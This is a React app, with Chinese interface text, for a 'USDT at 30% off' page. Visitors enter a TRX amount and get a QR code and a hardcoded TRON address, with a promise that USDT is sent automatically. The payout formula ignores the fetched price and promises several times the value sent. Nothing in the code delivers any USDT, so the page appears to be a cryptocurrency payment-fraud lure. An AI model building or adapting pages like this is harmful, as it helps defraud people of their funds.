import React, { useState, useEffect } from 'react';
import QRCode from 'react-qr-code';

const App = () => {
  const [trxAmount, setTrxAmount] = useState('');
  const [usdtAmount, setUsdtAmount] = useState('');
  const [trxPrice, setTrxPrice] = useState(null);
  const [showQR, setShowQR] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // 收款地址（接收TRX）
  const paymentAddress = 'TWRAzGd4KGgyESBbe4EFaADFMFgG999BcD';

  useEffect(() => {
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
      .then(res => res.json())
      .then(data => setTrxPrice(data.tron?.usd || 0.27))
      .catch(() => setTrxPrice(0.27));
  }, []);

  const calculateUsdt = (trx) => {
    const val = parseFloat(trx);
    if (!val || !trxPrice) return '';
    return (val / 0.7).toFixed(4); // 七折
  };

  const handleTrxChange = (e) => {
    const val = e.target.value;
    if (/^\d*\.?\d*$/.test(val)) {
      setTrxAmount(val);
      setUsdtAmount(calculateUsdt(val));
      setShowQR(false);
    }
  };

  const handleBuy = () => {
    if (!trxAmount || parseFloat(trxAmount) <= 0) return;
    setShowQR(true);
  };

  const handleCopyAmount = () => {
    navigator.clipboard.writeText(trxAmount);
    alert(`已复制金额: ${trxAmount} TRX`);
  };

  // 跳转到 TRON 钱包进行转账
  const handleRedirectToWallet = () => {
    // 使用 TronLink 钱包的 deeplink（ tronlink://）
    const walletUrl = `tronlink://trx/transfer?address=${paymentAddress}&amount=${trxAmount}`;
    
    // 尝试跳转至 TRON 钱包
    window.location.href = walletUrl;

    // 如果没有安装 TRON 钱包，跳转到官方 TRON 钱包下载页
    setTimeout(() => {
      window.open('https://tronlink.org', '_blank');
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 text-center space-y-5">
        <h1 className="text-2xl font-bold text-gray-800">USDT 七折购</h1>
        <p className="text-yellow-600 text-sm">仅限社区活动，扫码转账后自动发币</p>

        <p className="text-lg text-gray-700">
          当前 TRX 价格：${trxPrice?.toFixed(2) || '0.27'} / TRX
        </p>

        <input
          type="text"
          placeholder="输入TRX数量"
          value={trxAmount}
          onChange={handleTrxChange}
          className="w-full border border-gray-300 rounded-lg py-3 px-4 text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        <p className="text-sm text-gray-600">
          可获得 USDT：<span className="font-semibold">{usdtAmount || '0.0000'}</span>
        </p>

        <button
          onClick={handleBuy}
          disabled={isLoading || !trxAmount}
          className="w-full bg-blue-500 text-white py-3 rounded-lg font-semibold text-lg hover:bg-blue-600"
        >
          获取转账二维码
        </button>

        {showQR && (
          <div className="pt-4 space-y-3">
            <QRCode value={paymentAddress} size={150} className="mx-auto" />
            <p className="text-sm text-gray-600 break-all">
              📬 收款地址：<span className="font-medium">{paymentAddress}</span>
            </p>
            <p className="text-sm text-gray-600">
              💰 请手动输入转账金额：<span className="font-medium">{trxAmount} TRX</span>
            </p>
            <button
              onClick={handleCopyAmount}
              className="bg-yellow-500 text-white px-4 py-2 rounded-lg w-full"
            >
              一键复制金额
            </button>

            <button
              onClick={handleRedirectToWallet}
              className="bg-green-500 text-white px-4 py-2 rounded-lg w-full mt-2"
            >
              跳转到 TRON 钱包
            </button>

            <p className="text-xs text-red-500">⚠️ 请勿修改地址，否则无法收到 USDT</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;
